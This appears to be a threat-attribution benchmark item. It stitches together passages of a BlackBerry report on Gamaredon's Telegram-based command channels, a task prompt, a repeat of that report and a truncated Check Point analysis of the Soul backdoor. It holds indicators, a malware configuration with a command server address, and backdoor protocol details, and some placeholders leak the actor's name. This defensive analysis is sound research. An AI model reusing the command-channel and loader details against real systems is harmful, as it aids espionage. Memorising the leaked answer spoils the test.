[PLACEHOLDER]’s network infrastructure relies on multi-stage Telegram accounts for victim profiling and confirmation of geographic location, and then finally leads the victim to the next stage server for the final payload. This kind of technique to infect target systems is new.    Attack Vector  md5    sha-256    54c20281d74df35f625925d9c941e25b    9ecf13027af42cec0ed3159b1bc48e265683feaefa331f321507d12651906a91    File Name    Бас по Род. славе.docx    File Size    55175 bytes    Created    Бас по Род. славе.docx    Author    Admin    Last Modified    2022:05:03 08:59:00Z    Last Modified By    Пользователь         md5    sha-256    21a2e24fc146a7baf47e90651cf397ad    2d99e762a41abec05e97dd1260775bad361dfa4e8b4120b912ce9c236331dd3f    File Size    23347 bytes    Author    Admin    Last Modified    2022-11-04T09:35:00Z    Last Modified By    VKZ         In a similar fashion to their previous campaigns, [PLACEHOLDER] relies on the highly targeted distribution of weaponized documents. Their malicious lures mimic documents originating from real Ukrainian government organizations, and are carefully designed to trick those who may have a real reason to interact with those organizations.      Figure 1 – Malicious document in the name of “Luhansk People's Republic,” written in the Russian language       Figure 2 – Gamaredon’s malicious lure document written in the Ukrainian language in the name of the “National Police of Ukraine”       Figure 3 – Gamaredon’s malicious lure document in the Ukrainian language on behalf of a Ukrainian company working in the aerospace field       Figure 4 – Malicious lure document written in the Ukrainian language in the name of the Ministry of Justice of Ukraine                                      As an example, the document with the filename “Бас по Род. славе.docx” employs a remote template injection technique (CVE-2017-0199) in order to gain initial access. Once the malicious document is opened, it fetches the specified address and downloads the next stage of the attack chain.      Figure 5 – Malicious URL which downloads the next phase in the attack    Weaponization  The server's configuration deploys the next stage payload only to targets with a Ukrainian IP address. If it matches the IP's validation and confirms the target is indeed located in Ukraine, it then drops a heavily obfuscated VBA script.    md5    sha-256    da84f8b5c335deaef354958c62b8dafd    295654e3284158bdb94b40d7fb98ede8f3eab72171e027360a654f9523ece566    File Name    presume.wtf    File Size    55296 bytes    Author    user    Last Modified    2022:11:07 14:27:00    Last Modified By    Пользователь Windows           Figure 6 – Obfuscated routines from the second stage of the attack chain    The script creates the following location and drops a VBS file:    C:\Users\<user_name>\Downloads\expecting\deposit    Then it invokes the “wscript.exe” and runs the “deposit” file. Different implants may rely on other locations, as in the following examples:    C:\Users\<user_name>\Downloads\bars\decrepit  C:\Users\<user_name>\Downloads\baron\demonstration  C:\Users\<user_name>\deliberate.bmp  The “decrepit” VBS is instructed to connect to a hardcoded Telegram account and to get instructions in a slightly obfuscated format leading to a new malicious IP address.           Figure 7 – Deobfuscated code shows Gamaerdon’s Telegram account and components of the URL for the next stage    Each Telegram account periodically deploys new IP addresses. In an interesting twist, our findings confirm that this only happens during regular working hours in Eastern Europe. This indicates that this is very likely a human-operated activity rather than an automated one.      Figure 8 – Gamaredon’s Telegram account serves a next-stage IP address    Different Telegram accounts serve different IP addresses. For example, the account "zacreq" served the following IP addresses, and likely many more.    164.92.126[.]130  45.63.42[.]255  159.65.174[.]140  Once the IP address is obtained, it is then used to construct the URL for the next stage download.    Loader  Continuing with its execution, the script is instructed to issue a HTTP GET request to the URL "hxxp://" & IP_from_zacreq_TG & "/deposit" & random_number & "/expecting.vac=?derisive".      Figure 9 – Next stage delivery    Upon successful connection, the remote server returns base64 encode data blob, which decodes to a PowerShell script. The PowerShell script is instructed to download a “get.php” file from 213.69.3[.]218 IP address and run it.      Figure 10 – The base64 decoded data blob    To download the next stage, the “get.php” script is instructed to invoke the domain() function which reaches out to the Telegram channel "hxxps[:]//t[.]me/s/newtesta1" to obtain a slightly obfuscated IP address, the same way we’ve seen previously.      Figure 11 – Function to receive the IP for the next stage of the execution chain    The IP addresses listed in the “newtesta1” Telegram account are also changed periodically by the threat group.      Figure 12 – IP address for the final stage delivery    The BlackBerry Research and Intelligence Team has monitored this account over time and has identified the following IP address used for the delivery of the final payload:    45.77.229[.]159  64.227.1[.]3  64.227.7[.]134  84.32.128[.]41  84.32.128[.]215  104.131.39[.]154  143.110.221[.]189  157.230.223[.]20  157.230.123[.]48  158.247.199[.]37  158.247.199[.]225  165.22.7[.]242  167.172.173[.]7  170.64.152[.]42  198.13.42[.]40  206.189.143[.]206  217.69.3[.]218  Payload  If the specific criteria mentioned above is met, the server returns the payload. Upon receiving the payload, the "get.php" script invokes the decode() function to perform an XOR operation where the $key value is obtained from the  volume serial number.      Figure 13 – Final payload decoding function    Talos has already analyzed the final payload placement. We have observed minor changes, such as different variables and file names; however, the core logic remains the same.      Figure 14 – Final payload placement logic    Attack Flow    Figure 15 – [PLACEHOLDER] attack flow    Network  The [PLACEHOLDER] has used the hxxp://t[.]me/s/* URL structure in the stage which accesses Telegram to direct the execution to the next stage. We searched for this structure in VirusTotal and found the following additional Telegram C2’s.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: The [PLACEHOLDER] has been actively targeting the Ukrainian government lately, relying on the infrastructure of the popular messaging service Telegram to bypass traditional network traffic detection techniques without raising obvious flags. Back in November 2022, BlackBerry uncovered a new [PLACEHOLDER]campaign that relied on a multi-stage Telegram scheme to first profile potential victims, and then deliver the final payload along with the malicious command-and-control (C2).    This report provides information about the recent network infrastructure from Crimea that the [PLACEHOLDER] uses, as well as analysis of each step before the victims receive the final payload.    MITRE ATT&CK Information  Tactic    Technique    Execution    T1559.001, T1059.001, T1204.002, T1059.005    Persistence    T1547.001    Defense Evasion    T1027, T1221, T1036, T1140    Command and Control    T1102.002, T1105, T1571, T1008, T1071.001, T1573.001    Exfiltration    T1029         Weaponization and Technical Overview  Weapons    Obfuscated macro and PowerShell scripts, PE executables    Attack Vector    Spear-phishing, targeted maldocs    Network Infrastructure    DDNS, Telegram    Targets    Government organizations in Ukraine         Technical Analysis  Context    The [PLACEHOLDER] is a Russian state-sponsored cyber espionage group that has been active since 2013. Over the years, Gamaredon’s main target has always been Ukrainian government organizations. To bypass the government’s security measures, the threat group works continually to improve their malicious code over time.    In mid-September 2022, Talos Intelligence reported Gamaredon’s latest attack on Ukrainian government organizations and exposed details of the complete execution chain. In November 2022, the BlackBerry Research and Intelligence Team uncovered Gamaredon’s latest campaign, which relied on Telegram for malicious network structure purposes.    The initial infection vector we reported on was weaponized documents written in both the Russian and Ukrainian languages and sent via spear-phishing techniques, exploiting the remote template injection vulnerability that enables attackers to bypass Microsoft Word macro protections to compromise target systems with malware, gain access to information, then spread the infection to other users.    The [PLACEHOLDER]’s network infrastructure relies on multi-stage Telegram accounts for victim profiling and confirmation of geographic location, and then finally leads the victim to the next stage server for the final payload. This kind of technique to infect target systems is new.    Attack Vector  md5    sha-256    54c20281d74df35f625925d9c941e25b    9ecf13027af42cec0ed3159b1bc48e265683feaefa331f321507d12651906a91    File Name    Бас по Род. славе.docx    File Size    55175 bytes    Created    Бас по Род. славе.docx    Author    Admin    Last Modified    2022:05:03 08:59:00Z    Last Modified By    Пользователь         md5    sha-256    21a2e24fc146a7baf47e90651cf397ad    2d99e762a41abec05e97dd1260775bad361dfa4e8b4120b912ce9c236331dd3f    File Size    23347 bytes    Author    Admin    Last Modified    2022-11-04T09:35:00Z    Last Modified By    VKZ         In a similar fashion to their previous campaigns, [PLACEHOLDER] relies on the highly targeted distribution of weaponized documents. Their malicious lures mimic documents originating from real Ukrainian government organizations, and are carefully designed to trick those who may have a real reason to interact with those organizations.      Figure 1 – Malicious document in the name of “Luhansk People's Republic,” written in the Russian language       Figure 2 – Gamaredon’s malicious lure document written in the Ukrainian language in the name of the “National Police of Ukraine”       Figure 3 – Gamaredon’s malicious lure document in the Ukrainian language on behalf of a Ukrainian company working in the aerospace field       Figure 4 – Malicious lure document written in the Ukrainian language in the name of the Ministry of Justice of Ukraine                                      As an example, the document with the filename “Бас по Род. славе.docx” employs a remote template injection technique (CVE-2017-0199) in order to gain initial access. Once the malicious document is opened, it fetches the specified address and downloads the next stage of the attack chain.      Figure 5 – Malicious URL which downloads the next phase in the attack    Weaponization  The server's configuration deploys the next stage payload only to targets with a Ukrainian IP address. If it matches the IP's validation and confirms the target is indeed located in Ukraine, it then drops a heavily obfuscated VBA script.    md5    sha-256    da84f8b5c335deaef354958c62b8dafd    295654e3284158bdb94b40d7fb98ede8f3eab72171e027360a654f9523ece566    File Name    presume.wtf    File Size    55296 bytes    Author    user    Last Modified    2022:11:07 14:27:00    Last Modified By    Пользователь Windows           Figure 6 – Obfuscated routines from the second stage of the attack chain    The script creates the following location and drops a VBS file:    C:\Users\<user_name>\Downloads\expecting\deposit    Then it invokes the “wscript.exe” and runs the “deposit” file. Different implants may rely on other locations, as in the following examples:    C:\Users\<user_name>\Downloads\bars\decrepit  C:\Users\<user_name>\Downloads\baron\demonstration  C:\Users\<user_name>\deliberate.bmp  The “decrepit” VBS is instructed to connect to a hardcoded Telegram account and to get instructions in a slightly obfuscated format leading to a new malicious IP address.           Figure 7 – Deobfuscated code shows Gamaerdon’s Telegram account and components of the URL for the next stage    Each Telegram account periodically deploys new IP addresses. In an interesting twist, our findings confirm that this only happens during regular working hours in Eastern Europe. This indicates that this is very likely a human-operated activity rather than an automated one.      Figure 8 – Gamaredon’s Telegram account serves a next-stage IP address    Different Telegram accounts serve different IP addresses. For example, the account "zacreq" served the following IP addresses, and likely many more.    164.92.126[.]130  45.63.42[.]255  159.65.174[.]140  Once the IP address is obtained, it is then used to construct the URL for the next stage download.    Loader  Continuing with its execution, the script is instructed to issue a HTTP GET request to the URL "hxxp://" & IP_from_zacreq_TG & "/deposit" & random_number & "/expecting.vac=?derisive".      Figure 9 – Next stage delivery    Upon successful connection, the remote server returns base64 encode data blob, which decodes to a PowerShell script. The PowerShell script is instructed to download a “get.php” file from 213.69.3[.]218 IP address and run it.      Figure 10 – The base64 decoded data blob    To download the next stage, the “get.php” script is instructed to invoke the domain() function which reaches out to the Telegram channel "hxxps[:]//t[.]me/s/newtesta1" to obtain a slightly obfuscated IP address, the same way we’ve seen previously.      Figure 11 – Function to receive the IP for the next stage of the execution chain    The IP addresses listed in the “newtesta1” Telegram account are also changed periodically by the threat group.      Figure 12 – IP address for the final stage delivery    The BlackBerry Research and Intelligence Team has monitored this account over time and has identified the following IP address used for the delivery of the final payload:    45.77.229[.]159  64.227.1[.]3  64.227.7[.]134  84.32.128[.]41  84.32.128[.]215  104.131.39[.]154  143.110.221[.]189  157.230.223[.]20  157.230.123[.]48  158.247.199[.]37  158.247.199[.]225  165.22.7[.]242  167.172.173[.]7  170.64.152[.]42  198.13.42[.]40  206.189.143[.]206  217.69.3[.]218  Payload  If the specific criteria mentioned above is met, the server returns the payload. Upon receiving the payload, the "get.php" script invokes the decode() function to perform an XOR operation where the $key value is obtained from the  volume serial number.      Figure 13 – Final payload decoding function    Talos has already analyzed the final payload placement. We have observed minor changes, such as different variables and file names; however, the core logic remains the same.      Figure 14 – Final payload placement logic    Attack Flow    Figure 15 – [PLACEHOLDER] attack flow    Network  The [PLACEHOLDER] has used the hxxp://t[.]me/s/* URL structure in the stage which accesses Telegram to direct the execution to the next stage. We searched for this structure in VirusTotal and found the following additional Telegram C2’s.
https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/	In 2021, Check Point Research published a report on a previously undisclosed toolset used by [PLACEHOLDER], a long-running Chinese cyber-espionage operation targeting Southeast Asian government entities. Since then, we have continued to track the use of these tools across several operations in multiple Southeast Asian countries, in particular nations with similar territorial claims or strategic infrastructure projects such as Vietnam, Thailand, and Indonesia.    Key findings:    In late 2022, a campaign with an initial infection vector similar to previous [PLACEHOLDER] operations targeted a high-profile government entity in the region.  While [PLACEHOLDER]’s previous campaigns delivered a custom and unique backdoor called VictoryDll, the payload in this specific attack is a new version of SoulSearcher loader, which eventually loads the Soul modular framework. Although samples of this framework from 2017-2021 were previously analyzed, this report is the most extensive look yet at the Soul malware family infection chain, including a full technical analysis of the latest version, compiled in late 2022.  Although the Soul malware framework was previously seen in an espionage campaign targeting the defense, healthcare, and ICT sectors in Southeast Asia, it was never previously attributed or connected to any known cluster of malicious activity. Although it is currently not clear if the Soul framework is utilized by a single threat actor, based on our research we can attribute the framework to an APT group with Chinese origins.  The connection between the tools and TTPs (Tactics, Techniques and Procedures) of [PLACEHOLDER] and the previously mentioned attacks in Southeast Asia might serve as yet another example of key characteristics inherent to Chinese-based APT operations, such as sharing custom tools between groups or task specialization, when one entity is responsible for the initial infection and another one performs the actual intelligence gathering.  Introduction  At the beginning of 2021, Check Point Research identified an ongoing surveillance operation we named [PLACEHOLDER] that was targeting Southeast Asian government entities. The attackers used spear-phishing emails to gain initial access to the targeted networks. These emails typically contained a Word document with government-themed lures that leveraged a remote template to download and run a malicious RTF document, weaponized with the infamous RoyalRoad kit. Once inside, the malware starts a chain of in-memory loaders, comprised of a custom DLL downloader we call 5.t Downloader and a second-stage loader responsible for the delivery of a final backdoor. The final payload observed in [PLACEHOLDER] campaigns at the time was VictoryDll, a custom and unique malware that enabled remote access and data collection from the infected device. We tracked several earlier versions of the VictoryDll backdoor back to at least 2017, with the whole operation remaining under the radar the entire time.    Further tracking of [PLACEHOLDER] tools revealed multiple campaigns that targeted entities in Southeast Asian countries, such as Vietnam, Indonesia, and Thailand. During this time, multiple minor changes were implemented in the 5.t Downloader itself, but in general, the initial part of the infection chain (the use of Word documents, RoyalRoad RTF and 5.t Downloader) remained the same. However, in early 2023, when investigating an attack against one of the government entities located in the targeted region, the payload received from the actor’s geo-fenced C&C server was different from the VictoryDll backdoor observed before. Further analysis revealed that this payload is a new version of SoulSearcher loader, which is responsible for downloading, decrypting, and loading in memory other modules of the Soul modular backdoor.    Figure 1 - The infection chain.  Figure 1 – The infection chain.  The use of the Soul malware framework was described by Symantec in relation to the unattributed espionage operation targeting defense, healthcare, and ICT sectors in Southeast Asia in 2020-2021. Following up on that report, Fortinet researchers discovered other samples from 2017-2021 and described the evolution of the framework. Soul was also seen in 2019 in attacks against Vietnamese targets. None of these public reports attributed the Soul framework to any specific country or known actor, although researchers noted the “competent adversarial tradecraft” which they believed indicated a “possibly state-sponsored” group.    In this report, we provide a detailed technical explanation of several malicious stages used in this infection chain and the latest changes implemented in the Soul framework. We also discuss the challenges in attributing these attacks.    Downloader  The downloader, which in this specific case was dropped by RoyalRoad RTF to the disk as res6.a, is executed by a scheduled task with rundll32.exe, StartA. Its functionality is consistent with previous research of [PLACEHOLDER] activity. Similar to previous [PLACEHOLDER] campaigns, the C&C servers of the attackers are geofenced and return payloads only to requests from the IP addresses of the countries where the targets are located.    In the latest campaign, the actors implemented some changes in the downloader’s communication with the C&C. Previously, the entire C&C communication was based on sending data encrypted using RC4 and encoded with base64, with an exception for the HTTP request for payload which contained the hostname in plain text in the URI: /[**hostname]**.html.    However, in the new samples, the payload request is issued to the same PHP path as all the previous requests, with the host specified in its parameter, both MD5-hashed and in clear-text: [host_name]*[host_name_md5], e.g. MyComputer*d2122d4f4cdf26faa1b2f73bda6030f4 and then encoded:    /[php_name].php?Data=[encoded<host_name_and_host_md5>]    It’s noteworthy that while different keys were used, the encoding method using RC4+Base64 remained consistent in all cases.    In addition to changes in the URL patterns, the actors refrained from using the distinctive User-Agent “Microsoft Internet Explorer” and instead used a hardcoded generic one. A few of the samples we observed also communicated through HTTPS, not HTTP. Unlike the previous version where only the API calls were obfuscated, the new version also uses string encryption. However, the encryption is quite simple and consists of loop XORing an encrypted character with the difference of a loop index and a constant value:    Figure 2 - String decryption routine in the newest version of 5.t Downloader.  Figure 2 – String decryption routine in the newest version of 5.t Downloader.  As in previous versions, the downloader gathers data from the victim’s computer including hostname, OS name and version, system type (32/64 bit), username, MAC addresses of the networking adapters, and information on anti-virus solutions. If the threat actors find the victim’s machine to be a promising target, the response from the server contains the next stage executable in encrypted form and its MD5 checksum. After verifying the integrity of the received message, the downloader loads the decrypted DLL to memory and starts its execution from the StartW export function (the same name as the next stage loader export in previous campaigns that used the downloader).    SoulSearcher loader  SoulSearcher is a second-stage loader, which according to Fortinet research was seen in the wild since at least November 2018 and is responsible for executing the Soul backdoor main module and parsing its configuration. SoulSearcher has multiple variants based on where the configuration and payload are located and on the type of configuration. Among the samples used in the more recent activity cluster we have been researching, the SoulSearcher DLL (sha256: d1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0) was slightly different from any previously discovered samples, with the backdoor embedded inside the data section and the embedded configuration in XML format.    The malware checks if it runs under a process named svchost.exe, msdtc.exe or spoolsv.exe. If it does, it starts a thread on StartW export and continues loading the backdoor. This might be an indication of the loader being used in different infection chains than we observed in this attack with the rundll32.exe directly starting a chain of in-memory DLL loaders from StartW.    The payload loading process starts with obtaining the configuration. While previously seen XML SoulSearchers retrieved this from the registry, a file mapping object, or a file on the disk, the newest version loads the config from a hardcoded Base64 string and stores it in the registry path HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\CONFIGEX. The decoded data blob can be represented with the following struct:    struct compressed_data  {    DWORD magic;    DWORD unused;    BYTE lzma_properties[5];    DWORD size;    DWORD compressed_size;    BYTE decompressed_data_MD5[33];    BYTE compressed_data_MD5[33];    BYTE compressed_data[];  };  The loader contains a compressed Soul backdoor DLL in the data section of the loader, while previous samples stored it in the overlay.    Next, based on the system architecture, SoulSearcher appends 32 or 64 to the wide string L'ServerBase', hashes the resulting string with MD5, and creates the registry key with this hash: HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies\[ServerBaseArch_md5]. The value contains the compressed payload.    If the registry key is successfully created, the loader reads the compressed payload and proceeds to decrypt and load it in memory. The loading process itself is not different from previously discussed variants of SoulSearcher: it uses the compressed_data structure from the configuration to validate MD5 checksums, LZMA-decompress the compressed module, and reflectively load the Soul main module DLL in memory.    After loading the backdoor, Soul Searcher resolves the Construct export of the backdoor and calls it with the arguments [ServerBaseArch_md5] -Startup.    Soul Backdoor (main module)  The Soul main module is responsible for communicating with the C&C server and its primary purpose is to receive and load in memory additional modules. Interestingly, the backdoor configuration contains a “radio silence”-like feature, where the actors can specify specific hours in a week when the backdoor is not allowed to communicate with the C&C server.    The recovered sample of the backdoor is quite different from the samples that were previously analyzed. The new version of SoulBackdoor was compiled on 29/11/2022 02:12:34 UTC. Based on their timestamps, the earlier samples analyzed by other researchers are mostly from 2017 with the exception of one from 2018, which, similar to our case, was embedded inside the SoulSearcher loader.    The backdoor implements a custom C&C protocol, which is entirely different than previously observed versions. Both the old and new versions are based on HTTP communication, but the latest version seems to be more complex and uses various HTTP request methods such as GET, POST, and DELETE. The API endpoints are also different, and the C&C requests contain additional HTTP request headers. In terms of the backdoor functionality, the enumeration data is different from the previous versions and is more extensive. The supported C&C commands, with the newer variant primarily focused on loading additional modules, lack any type of common backdoor functionality like manipulating local files, sending files to the C&C, and executing remote commands.    Configuration and execution flow  The backdoor requires two arguments or the “-v” argument before performing its activity. As we mentioned earlier, in our case it is executed by SoulSearcher with [ServerBaseArch_md5] -Startup arguments.    Soul backdoor first creates an event using the hardcoded name Global\3GS7JR4S and checks the registry key HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF. It then uses the same configuration (from the registry key HKEY_CURRENT_USER\SOFTWARE\Software\Microsoft\CTF\CONFIGEX) with the compressed_data struct (as used by SoulSearcher) to extract the payload and decompress its own configuration. The configuration of the main module provides the parameters of C&C communication and other aspects of the backdoor execution. The compression algorithm is LZMA, similar to that found in older variants. After decompression, the config looks like this:    <CONFIG FLAG="X6bmLMbAL29AlxB">    <BASE>      <Ip>http://103.159.132.96/index.php</Ip>      <Dns>8.8.8.8|114.114.114.114|</Dns>      <Proxy></Proxy>      <CntPort>80|443</CntPort>      <LstPort>0</LstPort>      <Blog>NULL</Blog>      <DropboxBlog>NULL</DropboxBlog>      <HTTPS>false</HTTPS>    </BASE>    <SVC>      <SvcName>IKEEXT</SvcName>      <SvcDisp>@%SystemRoot%\system32\ikeext.dll,-501</SvcDisp>      <SvcDesc>@%SystemRoot%\system32\ikeext.dll,-502</SvcDesc>      <SvcDll>wlbsctrl.dll</SvcDll>    </SVC>    <ADV>      <OlPass>NULL</OlPass>      <OlTime>1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;</OlTime>      <SelfDestroy>2029-07-11 15:29:32</SelfDestroy>    </ADV>  </CONFIG>  In its base (<BASE>) settings, the configuration contains the parameter “LstPort”. In the previous versions, this provided the backdoor the ability to listen on a specified port. In this version, the code that supported this feature was removed, and the backdoor can only actively connect to the C&C server using the URL provided in the “IP” parameter on the “connect” port “Cnt”.    In the “advanced” section (<ADV>) of the configuration, the “OlTime” parameter contains a list of 168 (24×7) numbers, one per hour in a week. Each hour is represented either by 0 or 1. Zero means a “blocked” hour, and one represents an “allowed” hour. This way the operators of the malware can use the configuration to enforce the specific hours the backdoor is allowed to communicate with the C&C server. If the OlTime field is empty in the config, a default setting is for all days and hours to be configured as “allowed”. This is an advanced OpSec feature that allows the actors to blend their communication flow into general traffic and decrease the chances of network communication being detected. The “service” (<SVC>) section defines the parameters for the backdoor to be installed as a service:      <SVC>      <SvcName>IKEEXT</SvcName>      <SvcDisp>@%SystemRoot%\system32\ikeext.dll,-501</SvcDisp>      <SvcDesc>@%SystemRoot%\system32\ikeext.dll,-502</SvcDesc>      <SvcDll>wlbsctrl.dll</SvcDll>    </SVC>  The Symantec publication also mentioned the Soul Searcher running as a service, but in the sample we analyzed, there is no code that implements this feature. Judging by the settings left in the configuration we observed, the actors performed some variation of IKEEXT DLL Hijacking, when on the start of the IKEEXT service, svchost.exe would load the malicious DLL, saved as wlbsctrl.dll.    After loading and parsing the configuration the backdoor checks the registry HKEY_CURRENT_USER\SOFTWARE\Software\Microsoft\CTF\Assemblies for the existence of a key with the name of MD5 hash of the wide string L"AutoRun". If it exists, the backdoor decompresses, loads in memory, and executes the Construct export of the DLL stored in this key. Although we didn’t witness the creation or usage of this additional DLL payload, this logic is likely used for auto-updates or executing specific actions prior to the main backdoor activity.    After all of these steps are concluded, the backdoor begins the execution of its main thread.    C&C communication  The main thread begins by validating that it received from the configuration the C&C URL and DNS (or blog URL, which is empty in our case), and that the C&C URL starts with http://, https:// or ftp://. In this specific sample, we did not observe any type of FTP communication capabilities. Then, if the current hour is “allowed” by OlTime configuration, it begins the C&C communication.    Bot registration and victim fingerprinting    The first request is sent to the specified URL with the ClientHello parameter. The MD5 header is an MD5 hash of the body. As there is no data transferred by this request, the MD5 (d41d8cd98f00b204e9800998ecf8427e) is of an empty string. In further analysis of the requests, we omit the common headers (Cache-Control, Connection, User-Agent, MD5 and Host) as their meaning doesn’t change between the requests.    GET /index.php?ClientHello HTTP/1.1  Cache-Control: no-cache  Connection: Keep-Alive  User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)  MD5: d41d8cd98f00b204e9800998ecf8427e  Content-Length: 0  Host: 103.159.132.96  The expected response from the C&C server is ERR! ParamError! In case of a bad or no response, the backdoor attempts to resolve the IP address of the C&C server on its own through the DNS servers in the config.    Figure 3 - C&C DNS resolution  Figure 3 – C&C DNS resolution  If the response is correct, it saves the C&C IP address in this format: SVR:[IP_field_from_config]:[CntPort] to the registry key HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\SVIF.    Next, the module performs a full system enumeration and collects the following data:    Processor name and the number of processors, total physical memory and total available physical memory, and information about the hard disk such as total space and free space.  The OS architecture and various information from the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion registry key such as ProductName, CSDVersion, ProductId, RegisteredOwner, RegisteredOrganization etc.  Computer name and information about the current user, such as admin rights retrieved with NetUserGetInfo API.  Time zone information from both HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation and HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time Zones registry.  Local IP address of the machine, and its public IP address, obtained by issuing a request to one of the public IP resolution services such as https://www.whatismyip.com/:  Figure 4 - Victim machine enumeration data string  Figure 4 – Victim machine enumeration data string  After the system enumeration, the backdoor generates a botUUID, concatenating with “-” two MD5 strings based on various parameters from the enumerated data. It saves the botUUID to the registry key HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\UUID. The resulting botUUID looks like this:    5d41402abc4b2a76b9719d911017c592-7d793037a0760186574b0282f2f435e7    and is used in all the following network requests.    New C&C connection    After the system enumeration, the backdoor issues a series of requests to “register” a new connection and perform validation against the C&C server.    First, the backdoor notifies the server of a new connection. It is implemented as a DELETE request with the botUUID:    DELETE /index.php?[botUUID];[botUUID].txt HTTP/1.1  The accepted response from the C&C: OK!    Next, the Connect request is sent, whose body contained Base64 of the string ConnectXXXXXXXX, where XXXXXXXX is the connection timestamp retrieved by GetTickCount() API.    POST /index.php?[botUUID]/REQ.dat HTTP/1.1  [Base64-encoded string]  The accepted response from the C&C: OK!    The following request prepares the server to receive the enumeration data from the victim’s machine:    GET /index.php?Enum;[botUUID]_[connection_timestamp].txt HTTP/1.1  The accepted response from the C&C is a string that looks like this: ./Updata/[botUUID]_[connection_timestamp].txt.    This is most likely the path on the server to store the enumeration data.    After this the backdoor sends another network request, possibly for verification:    GET /index.php?D;[botUUID]_[connection_timestamp].txt HTTP/1.1  The accepted response is a base64-encoded string that contains the botUUID.    At the end of this process, if all the requests are successful, the backdoor is “registered” at the C&C server and continues sending information about the system.    Send enumerated data    From this point on, the data sent between the backdoor and the C&C server relies on another struct, c2_body:    struct c2_body  {    DWORD special_flag;    DWORD additional_data;    DWORD const_float;    BYTE command_id;  };  const_float, where used, is a hardcoded value, 5.2509999. special_flag and additional_data seem to be multipurpose variables that have different meanings in different contexts of the program execution. When sent in the body of both requests and responses, this struct is compressed according to the previously described compressed_data struct from SoulSearcher, and then encoded with Base64.    First, the backdoor sends the current timestamp in the request to the following URL (a new timestamp is again retrieved by GetTickCount() API).    POST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1  [base64-encoded and compressed c2_body]  In this request, special_flag is 0x00, command_id is 0x01 and additonal_data is the tick count. The accepted response is OK! Otherwise, the backdoor sleeps and starts the connection from the beginning.    Next, the backdoor collects the enumeration data again, and compresses it using another struct:    struct enum_compressed_data  {    c2_body c2_msg;    compressed_data enum_data;  };  The struct is then encoded with Base64 and sent in the body of the following request (the URL and methods are the same):    POST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1  [base64-encoded and compressed enum_compressed_data]  The command_id is the same 0x01, special_flag=0, additional_data= 0x4000 + 0x49 = size of enum data.    The accepted response is also OK!    Main C&C loop    After posting the enumeration data, the backdoor enters an infinite loop, contacting the C&C server with the following request to receive the commands:    GET /index.php?CDD;[botUUID]_[connection_timestamp].txt;[botUUID]_[connection_timestamp]/Data_C_* HTTP/1.1  If there is no C&C command for the victim, the server responds with ERR! Path not found, WAIT!    If there is a command to execute, the C&C returns it in a base64-encoded string which is decompressed with compressed_data and parsed as c2_body. Then the command_id from the struct is translated to the actual command execution.    Soul Backdoor Commands  The main commands that can be received from the C&C server are control messages for the bot:    Command ID Action Description  0x04 Execute command Create a thread that handles commands from the second set of commands.  0x0D Client keep-alive Mirror the request from the C&C server.  0x0E Restart C&C session Send DELETE request and restart the communication from client Hello.  0x0F Exit Send DELETE request and exit process forcefully.  If in the c2_body the special_flag is set to one, the backdoor starts a continuous loop requesting data from the C&C server. The server should respond with a module name to be loaded from the Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies registry key, which is executed from its Construct export. Then the backdoor proceeds to execute the command specified in command_id.    If the command_id is 0x04, the backdoor spawns a new “command execution” thread that performs a similar network communication flow as the main thread, only without sending the enumeration data.    It then begins handling the following commands:    Command ID Action Description  0xF Exit thread If the command_flag is on stop, exit the “command execution” thread. Otherwise do nothing  0x61 Install modules The server sends the number of modules to be written to the registry. Then the bot makes requests to the C&C server, once per module and writes it to a specified registry key. Validate the result by executing command 0x65 afterward.  All the registry keys are under Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies.  0x62 Delete modules Delete registry keys that are sent by the C&C in a string separated by semi-colons (;). Validate the result by executing command 0x65 afterward.  0x63 Validate modules Validate that modules are currently compatible with the system architecture. The modules are located in the registry, and registry keys names are sent by the C&C separated by a semi-colon.  0x64 Load module Load the specified module and call its export function Construct. The registry key where the module is stored is sent by the C&C server.  0x65 Enumerate modules Create a buffer with all registry keys under Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies in the format of %s:%f:; (key name and first 4 bytes of the value), then send the buffer back to the C&C.  All the received modules are stored compressed in the registry. The decompression is performed according to another struct:    struct stored_module  {    float version_or_id;    QWORD decompressed_size;    QWORD compressed_size;    BYTE md5sum[33];    BYTE compressed_data[];  };  We didn’t witness any follow-up modules, but due to the modular nature of the backdoor, we can expect the actors to use all kinds of data-stealing modules, keyloggers, data exfiltration modules and likely also a lateral movement toolset.    Attribution  As the first stages of the infection chain are identical to the previously described [PLACEHOLDER] activity, many of the indicators that allowed us to attribute the threat actors to Chinese-based threat groups are still relevant in relation to the subsequent attack attempts described in this report:    The RoyalRoad RTF kit was reported as the tool of choice 